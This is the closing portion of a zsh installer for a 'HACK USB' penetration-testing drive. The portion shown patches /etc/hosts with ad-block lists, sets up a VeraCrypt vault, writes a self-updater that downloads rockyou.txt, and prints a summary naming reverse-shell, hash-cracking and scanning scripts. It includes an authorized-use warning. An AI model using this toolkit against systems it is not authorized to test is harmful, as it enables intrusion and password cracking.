info "Profile: ${PN}  |  ${CNT} domains to block"

# ── Backup + patch /etc/hosts ──────────────────────────────────────────────
[[ -f "$BACKUP" ]] || { cp "$HOSTS" "$BACKUP" && ok "Original backed up: $BACKUP"; }
remove_entries || { err "Failed to clean old entries"; exit 1; }

TMPF=$(mktemp) || exit 1
{
  cat "$HOSTS"
  echo ""
  echo "$MARKER_START"
  echo "# Profile: ${PN} | Domains: ${CNT} | $(date '+%Y-%m-%d %H:%M:%S')"
  echo "# Disable: sudo zsh $0 --restore"
  echo "# Update:  sudo zsh $0 --update"
  echo ""
  grep "^0\.0\.0\.0" "$BL"
  echo ""
  echo "$MARKER_END"
} > "$TMPF" 2>/dev/null || { err "Write error"; rm -f "$TMPF"; exit 1; }

cp "$TMPF" "$HOSTS" || { err "Could not write /etc/hosts"; rm -f "$TMPF"; exit 1; }
rm -f "$TMPF"
flush_dns

FINAL=$(grep -c "^0\.0\.0\.0" "$HOSTS" 2>/dev/null || echo 0)
echo ""
ok "Ad-Blocker ACTIVE — ${FINAL} domains blocked in /etc/hosts"
echo ""
echo -e "  ${DIM}Status:  sudo zsh $0 --status${NC}"
echo -e "  ${DIM}Disable: sudo zsh $0 --restore${NC}"
echo -e "  ${DIM}Update:  sudo zsh $0 --update${NC}"
echo ""
ADSCRIPT

  chmod +x "$ab/setup_adblocker.zsh"
  log_ok "setup_adblocker.zsh ✓  (6 lists: Hagezi + Steven Black + oisd)"
  log_ok "${combined} domains in hosts_combined.txt"
  echo -e "  ${CYAN}Enable: sudo zsh $ab/setup_adblocker.zsh${NC}"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 12 — ENCRYPTED VAULT                              ║
# ╚══════════════════════════════════════════════════════════╝
setup_vault() {
  [[ $ENABLE_VAULT -eq 0 ]] && return
  section "STEP 12 — ENCRYPTED VAULT"
  local vault_dir="$USB_ROOT/14_vault"
  local vault_file="$USB_ROOT/secrets.vc"
  mkdir -p "$vault_dir"

  cat > "$vault_dir/vault.zsh" << 'VAULTSCRIPT'
#!/usr/bin/env zsh
# vault.zsh | Needs: veracrypt | Usage: zsh vault.zsh [mount|unmount|status|backup]
USB="${0:A:h:h}"; VF="$USB/secrets.vc"
case "$(uname -s)" in Darwin*) MP="/Volumes/VAULT" ;; *) MP="/mnt/hackusb_vault" ;; esac
G='\033[0;32m';R='\033[0;31m';C='\033[0;36m';NC='\033[0m'
command -v veracrypt &>/dev/null || { echo -e "${R}  ✗ VeraCrypt missing${NC}\n  macOS: brew install --cask veracrypt\n  Linux: https://veracrypt.fr"; exit 1; }
case "${1:-mount}" in
  mount)   [[ ! -f "$VF" ]] && { echo -e "${R}  ✗ $VF not found${NC}"; exit 1; }
           mkdir -p "$MP" 2>/dev/null || sudo mkdir -p "$MP" 2>/dev/null || true
           veracrypt "$VF" "$MP" && echo -e "${G}  ✓ Vault: $MP${NC}" || echo -e "${R}  ✗ Failed${NC}" ;;
  unmount|umount) veracrypt -d "$VF" && echo -e "${G}  ✓ Unmounted${NC}" || echo -e "${R}  ✗${NC}" ;;
  status)  veracrypt -l 2>/dev/null | grep -q "secrets.vc" && { echo -e "${G}  ✓ Vault: $MP${NC}"; df -h "$MP" 2>/dev/null | tail -1; } || echo "  Vault not mounted" ;;
  backup)  local b="${0:A:h}/secrets.vc.bak.$(date +%Y%m%d)"; cp "$VF" "$b" && echo -e "${G}  ✓ Backup: $b${NC}" || echo -e "${R}  ✗${NC}" ;;
  *)       echo "Usage: zsh vault.zsh [mount|unmount|status|backup]" ;;
esac
VAULTSCRIPT
  chmod +x "$vault_dir/vault.zsh"

  if [[ -f "$vault_file" ]]; then
    log_warn "Container exists — not overwritten"
  elif command -v veracrypt &>/dev/null && [[ -n "$VAULT_PASS" ]]; then
    log_info "Creating VeraCrypt container (${VAULT_SIZE_MB} MB) ..."
    veracrypt --text --create "$vault_file" \
      --size="${VAULT_SIZE_MB}M" --volume-type=normal \
      --encryption=AES --hash=SHA-512 --filesystem=FAT \
      --password="$VAULT_PASS" --random-source=/dev/urandom \
      --non-interactive >> "$LOG_FILE" 2>&1 \
      && log_ok "Container: $vault_file  ($(du -sh "$vault_file" | cut -f1))" \
      || log_err "Failed — manual: veracrypt --create secrets.vc --size=${VAULT_SIZE_MB}M --encryption=AES"
  else
    log_warn "VeraCrypt unavailable — setup instructions created"
    echo "veracrypt --create $vault_file --size=${VAULT_SIZE_MB}M --encryption=AES --hash=SHA-512 --filesystem=FAT" > "$vault_dir/create_vault.sh"
    chmod +x "$vault_dir/create_vault.sh"
  fi
  log_ok "vault.zsh (mount/unmount/status/backup)"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 13 — AUTO-UPDATE                                  ║
# ╚══════════════════════════════════════════════════════════╝
write_autoupdate() {
  [[ $ENABLE_AUTOUPDATE -eq 0 ]] && return
  section "STEP 13 — AUTO-UPDATE SCRIPT"

  cat > "$USB_ROOT/hackusb_update.zsh" << 'UPDATESCRIPT'
#!/usr/bin/env zsh
# hackusb_update.zsh — Updates all git repos, blocklists, wordlists
# Needs: git, curl, zsh | Usage: sudo zsh hackusb_update.zsh [--force]
USB="${0:A:h}"; LOG="$USB/update.log"; FORCE=0
[[ "${1:-}" == "--force" ]] && FORCE=1
G='\033[0;32m';C='\033[0;36m';Y='\033[1;33m';R='\033[0;31m';D='\033[2m';NC='\033[0m'
ok(){ echo -e "${G}  ✓${NC}  $1" | tee -a "$LOG"; }; info(){ echo -e "${C}  →${NC}  $1" | tee -a "$LOG"; }
warn(){ echo -e "${Y}  !${NC}  $1" | tee -a "$LOG"; }; err(){ echo -e "${R}  ✗${NC}  $1" | tee -a "$LOG"; }
UPDATED=0; FAILED=0; SKIPPED=0
echo "" | tee "$LOG"; echo -e "${C}  HACK USB Update — $(date '+%Y-%m-%d %H:%M')${NC}" | tee -a "$LOG"; echo ""
curl -s --max-time 5 https://github.com >/dev/null 2>&1 || { err "No internet"; exit 1; }
ok "Internet OK"

echo ""; info "Updating Git repos..."; echo ""
find "$USB" -maxdepth 3 -name ".git" -type d 2>/dev/null | sort | while read gitdir; do
  repo="$(dirname $gitdir)"; name="$(basename $repo)"
  [[ -w "$repo" ]] || { warn "$name — not writable"; continue; }
  cd "$repo" 2>/dev/null || continue
  OLD=$(git rev-parse HEAD 2>/dev/null || echo "x")
  if git pull --ff-only --quiet --rebase=false >> "$LOG" 2>&1; then
    NEW=$(git rev-parse HEAD 2>/dev/null || echo "y")
    [[ "$OLD" != "$NEW" ]] \
      && ok "$name — $(git log --oneline ${OLD}..HEAD 2>/dev/null | wc -l | tr -d ' ') new commits" && UPDATED=$((UPDATED+1)) \
      || { ok "$name — up to date"; SKIPPED=$((SKIPPED+1)); }
  else
    git fetch --quiet >> "$LOG" 2>&1
    git reset --hard origin/main >> "$LOG" 2>&1 || git reset --hard origin/master >> "$LOG" 2>&1 || true
    warn "$name — hard reset"; UPDATED=$((UPDATED+1))
  fi
  cd "$USB"
done

echo ""; info "rockyou.txt ..."
RY="$USB/09_wordlists/rockyou.txt"
if [[ ! -f "$RY" || $FORCE -eq 1 ]]; then
  curl -L --progress-bar -o "$RY.tmp" "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" 2>&1 \
    && mv "$RY.tmp" "$RY" && ok "rockyou.txt ✓" && UPDATED=$((UPDATED+1)) \
    || { rm -f "$RY.tmp"; err "Download failed"; FAILED=$((FAILED+1)); }
else; ok "rockyou.txt exists (--force to re-download)"; SKIPPED=$((SKIPPED+1)); fi

AB="$USB/13_adblocker"
if [[ -d "$AB/hosts_lists" ]]; then
  echo ""; info "Updating blocklists (Hagezi + Steven Black + oisd)..."; echo ""
  # fname:primary_url:fallback_url — colon-separated
  local -a BL_DEFS=(
    "hosts_hagezi_light.txt:https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/light.txt:https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/light.txt"
    "hosts_hagezi_pro.txt:https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/pro.txt:https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/pro.txt"
    "hosts_hagezi_malware.txt:https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/threat-intelligence-feeds.txt:https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/threat-intelligence-feeds.txt"
    "hosts_hagezi_ultimate.txt:https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/ultimate.txt:https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/ultimate.txt"
    "hosts_steven_black.txt:https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts:https://cdn.jsdelivr.net/gh/StevenBlack/hosts@master/hosts"
    "hosts_oisd_basic.txt:https://hosts.oisd.nl/basic/:https://small.oisd.nl/"
  )
  for entry in "${BL_DEFS[@]}"; do
    fname="${entry%%:*}"; rest="${entry#*:}"; url_a="${rest%%:*}"; url_b="${rest#*:}"
    dl_ok=0
    for try in 1 2; do
      curl -fsSL --max-time 120 --retry 2 -o "$AB/hosts_lists/$fname.tmp" "$url_a" 2>/dev/null && dl_ok=1 && break
      sleep 2
    done
    [[ $dl_ok -eq 0 ]] && curl -fsSL --max-time 120 --retry 2 -o "$AB/hosts_lists/$fname.tmp" "$url_b" 2>/dev/null && dl_ok=1
    if [[ $dl_ok -eq 1 ]]; then
      cnt=$(grep -c "^0\.0\.0\.0" "$AB/hosts_lists/$fname.tmp" 2>/dev/null || echo 0)
      if (( cnt > 1000 )); then
        mv "$AB/hosts_lists/$fname.tmp" "$AB/hosts_lists/$fname"
        ok "$fname — ${cnt} domains"; UPDATED=$((UPDATED+1))
      else
        rm -f "$AB/hosts_lists/$fname.tmp"
        warn "$fname — only ${cnt} entries, keeping old"; SKIPPED=$((SKIPPED+1))
      fi
    else
      rm -f "$AB/hosts_lists/$fname.tmp"
      warn "$fname — download failed (no internet?)"; FAILED=$((FAILED+1))
    fi
  done
  # Rebuild combined: Hagezi Pro + Malware + Steven Black + oisd
  {
    grep "^0\.0\.0\.0" "$AB/hosts_lists/hosts_hagezi_pro.txt"     2>/dev/null
    grep "^0\.0\.0\.0" "$AB/hosts_lists/hosts_hagezi_malware.txt" 2>/dev/null
    grep "^0\.0\.0\.0" "$AB/hosts_lists/hosts_steven_black.txt"   2>/dev/null
    grep "^0\.0\.0\.0" "$AB/hosts_lists/hosts_oisd_basic.txt"     2>/dev/null
  } | sort -u > "$AB/hosts_combined.txt"
  ok "hosts_combined.txt rebuilt — $(wc -l < $AB/hosts_combined.txt | tr -d ' ') domains"
fi

echo ""; echo -e "${G}  ✓ Update done${NC}"
echo -e "  ${C}Updated:${NC} $UPDATED  ${D}Skipped: $SKIPPED  Failed: $FAILED${NC}"
echo "$(date '+%Y-%m-%d %H:%M:%S') Updated:$UPDATED Skipped:$SKIPPED Failed:$FAILED" >> "$USB/.last_update"
echo ""
UPDATESCRIPT

  chmod +x "$USB_ROOT/hackusb_update.zsh"
  log_ok "hackusb_update.zsh ✓"
  if [[ "$OS_TYPE" != "windows_native" ]]; then
    ask "  Set up monthly cronjob? [y/N]"
    if [[ $REPLY =~ ^[Yy]$ ]]; then
      (crontab -l 2>/dev/null | grep -v "hackusb_update"; \
       echo "0 3 1 * * sudo zsh $USB_ROOT/hackusb_update.zsh --force >> $USB_ROOT/update.log 2>&1") | crontab -
      log_ok "Cron: 1st of every month at 03:00"
    fi
  fi
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 14 — CHEATSHEET                                   ║
# ╚══════════════════════════════════════════════════════════╝
copy_cheatsheet() {
  section "STEP 14 — CHEATSHEET"
  local cs="$USB_ROOT/10_cheatsheets"
  local src="${0:A:h}/hackusb_cheatsheet.html"
  if [[ -f "$src" ]]; then
    cp "$src" "$cs/index.html"
    log_ok "index.html ✓  ($(wc -c < "$cs/index.html" | tr -d ' ') bytes)"
  else
    log_warn "hackusb_cheatsheet.html not found — creating placeholder"
    printf '<html><body style="background:#0c0c0e;color:#d8dce8;font-family:monospace;padding:40px"><h1 style="color:#ff3355">HACK USB</h1><p>Copy hackusb_cheatsheet.html as index.html into 10_cheatsheets/</p></body></html>' > "$cs/index.html"
  fi
}

# ╔══════════════════════════════════════════════════════════╗
# ║  SUMMARY                                                ║
# ╚══════════════════════════════════════════════════════════╝
show_summary() {
  local size; size=$(du -sh "$USB_ROOT" 2>/dev/null | cut -f1)
  echo ""
  echo -e "${GREEN}${BOLD}"
  echo "  ╔══════════════════════════════════════════╗"
  echo "  ║   ✓  HACK USB — SETUP COMPLETE!         ║"
  echo "  ╚══════════════════════════════════════════╝"
  echo -e "${NC}"
  echo -e "  ${CYAN}Path:${NC}    $USB_ROOT"
  echo -e "  ${CYAN}Profile:${NC} $INSTALL_PROFILE  (${USB_SIZE_GB} GB)"
  echo -e "  ${CYAN}OS:${NC}      $OS_TYPE  ($PKG_MGR)"
  echo -e "  ${CYAN}Used:${NC}    $size"
  echo -e "  ${CYAN}Log:${NC}     $LOG_FILE"
  echo ""
  hr
  echo -e "  ${BOLD}Installed runtimes:${NC}"
  command -v python3   &>/dev/null && echo -e "  ${GREEN}✓${NC}  Python  $(python3 --version 2>&1 | cut -d' ' -f2)"  || echo -e "  ${RED}✗${NC}  Python3 missing"
  command -v node      &>/dev/null && echo -e "  ${GREEN}✓${NC}  Node.js $(node --version)"                          || echo -e "  ${RED}✗${NC}  Node.js missing"
  command -v go        &>/dev/null && echo -e "  ${GREEN}✓${NC}  Go      $(go version 2>&1 | cut -d' ' -f3)"         || echo -e "  ${RED}✗${NC}  Go missing"
  command -v ruby      &>/dev/null && echo -e "  ${GREEN}✓${NC}  Ruby    $(ruby --version 2>&1 | cut -d' ' -f2)"     || echo -e "  ${YELLOW}!${NC}  Ruby missing"
  command -v rustc     &>/dev/null && echo -e "  ${GREEN}✓${NC}  Rust    $(rustc --version 2>&1 | cut -d' ' -f2)"    || echo -e "  ${YELLOW}!${NC}  Rust missing"
  command -v git       &>/dev/null && echo -e "  ${GREEN}✓${NC}  git     $(git --version 2>&1 | cut -d' ' -f3)"
  command -v nmap      &>/dev/null && echo -e "  ${GREEN}✓${NC}  nmap    $(nmap --version 2>&1 | head -1 | cut -d' ' -f3)"
  command -v airmon-ng &>/dev/null && echo -e "  ${GREEN}✓${NC}  aircrack-ng ✓" || echo -e "  ${YELLOW}!${NC}  aircrack-ng missing (wireless)"
  command -v cargo     &>/dev/null && echo -e "  ${GREEN}✓${NC}  cargo   $(cargo --version 2>&1 | cut -d' ' -f2)"
  echo ""
  hr
  echo -e "  ${BOLD}Features:${NC}"
  [[ $ENABLE_AUTOUPDATE -eq 1 ]] && echo -e "  ${GREEN}✓${NC}  Auto-Update:  sudo zsh $USB_ROOT/hackusb_update.zsh"
  [[ $ENABLE_VAULT      -eq 1 ]] && echo -e "  ${GREEN}✓${NC}  Vault:        zsh $USB_ROOT/14_vault/vault.zsh mount"
  [[ $ENABLE_ADBLOCKER  -eq 1 ]] && echo -e "  ${GREEN}✓${NC}  Ad-Blocker:   sudo zsh $USB_ROOT/13_adblocker/setup_adblocker.zsh"
  echo ""
  hr
  echo -e "  ${BOLD}Custom Scripts:${NC}"
  echo -e "  ${GREEN}→${NC}  auto_recon.zsh        zsh 08_scripts/auto_recon.zsh <TARGET> [--full]"
  echo -e "  ${GREEN}→${NC}  subdomain_enum.zsh    zsh 08_scripts/subdomain_enum.zsh <DOMAIN>"
  echo -e "  ${GREEN}→${NC}  livehosts.py          python3 08_scripts/livehosts.py 192.168.1.0/24"
  echo -e "  ${GREEN}→${NC}  port_scan.py          python3 08_scripts/port_scan.py <HOST> [1-65535]"
  echo -e "  ${GREEN}→${NC}  hashcrack.py          python3 08_scripts/hashcrack.py <HASH>"
  echo -e "  ${GREEN}→${NC}  revshell_gen.py       python3 08_scripts/revshell_gen.py <LHOST> <LPORT>"
  echo -e "  ${CYAN}→${NC}  install_on_pc.zsh     zsh 08_scripts/install_on_pc.zsh  ${DIM}(install tools on any PC)${NC}"
  hr
  echo ""
  echo -e "  ${YELLOW}${BOLD}Next steps:${NC}"
  case "$OS_TYPE" in
    macos)          echo -e "  ${GREEN}1.${NC}  open $USB_ROOT/10_cheatsheets/index.html" ;;
    linux)          echo -e "  ${GREEN}1.${NC}  xdg-open $USB_ROOT/10_cheatsheets/index.html" ;;
    windows_wsl)    echo -e "  ${GREEN}1.${NC}  explorer.exe \$(wslpath -w $USB_ROOT/10_cheatsheets/index.html)" ;;
    windows_native) echo -e "  ${GREEN}1.${NC}  start $USB_ROOT/10_cheatsheets/index.html" ;;
  esac
  echo -e "  ${GREEN}2.${NC}  zsh $USB_ROOT/08_scripts/auto_recon.zsh localhost"
  echo -e "  ${GREEN}3.${NC}  zsh $USB_ROOT/08_scripts/install_on_pc.zsh  ${DIM}# install tools on this PC${NC}"
  [[ $ENABLE_ADBLOCKER -eq 1 ]] && echo -e "  ${GREEN}4.${NC}  sudo zsh $USB_ROOT/13_adblocker/setup_adblocker.zsh"
  echo ""
  echo -e "  ${DIM}Activate PATH: source $SHELL_RC${NC}"
  echo ""
  echo -e "  ${RED}⚠  Use only on your own / authorized systems!${NC}"
  echo -e "  ${DIM}CH: Art. 143bis StGB  |  DE: §202a StGB  |  US: CFAA 18 U.S.C. §1030${NC}"
  echo ""
}

# ╔══════════════════════════════════════════════════════════╗
# ║  MAIN                                                   ║
# ╚══════════════════════════════════════════════════════════╝
main() {
  show_banner
  choose_os             # Step 0: manual OS selection FIRST
  detect_os             # Step 1: confirm / auto-detect
  choose_usb_size       # Step 2
  choose_target_path    # Step 3
  choose_features       # Step 4: auto-update, vault, ad-blocker
  prepare_usb           # Step 5: format + password
  install_all_deps      # Step 6: brew/apt/winget + node/go/rust/ruby/pip
  create_structure      # Step 7: 17 directories
  clone_tools           # Step 8: git repos + requirements
  download_wordlists    # Step 9: rockyou + extras
  write_scripts         # Step 10: custom scripts incl. install_on_pc.zsh
  setup_adblocker       # Step 11: hagezi blocklists
  setup_vault           # Step 12: VeraCrypt AES-256
  write_autoupdate      # Step 13: hackusb_update.zsh
  copy_cheatsheet       # Step 14: index.html
  show_summary          # Done
}

main "$@"
